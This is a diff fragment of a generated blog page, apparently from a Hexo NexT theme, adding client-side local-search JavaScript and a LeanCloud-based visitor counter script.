+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("WfRk4KOVuh06s46E7euG6tNc-gzGzoHsz", "NIrmnjH4FUV4qGBkH2n689RM");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
